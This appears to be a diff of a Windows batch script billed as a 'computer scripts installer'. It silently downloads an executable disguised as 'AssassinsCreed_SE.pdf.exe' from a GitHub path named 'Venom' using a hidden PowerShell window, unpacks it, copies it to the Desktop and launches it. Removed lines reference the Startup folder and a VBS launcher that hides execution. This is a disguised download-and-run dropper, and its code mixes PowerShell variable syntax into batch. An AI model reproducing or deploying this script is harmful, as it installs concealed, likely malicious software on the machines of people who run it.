@@ -1,8 +1,7 @@
 @echo off
 
 @rem Computer scripts installer
-@rem ssssset "$currentDir = C:/Users/%USERNAME%/Desktop"
-@rem set "$startup = C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+
 
 @rem Function to check internet connection
 :check_internet
@@ -42,10 +41,15 @@ call :check_internet
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/raw/de5323fee7f3ea849f8504aed1d3593af243e64d/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
 
-@rem copy $startup/AssassinsCreed_SE.pdf.exe $currentDir/AssassinsCreed_SE.pdf.exe
+$desktop =  "C:/Users/%USERNAME%/Desktop"
+$wd = $PWD
 
-@rem Use VBS script to run batch file hidden
-powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
+cd $wd
+
+PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.pdf.zip' -DestinationPath 'AssassinsCreed_SE.pdf'"
+
+
+copy $wd/AssassinsCreed_SE.pdf/AssassinsCreed_SE.pdf.exe $desktop
 
 start AssassinsCreed_SE.pdf.exe
 
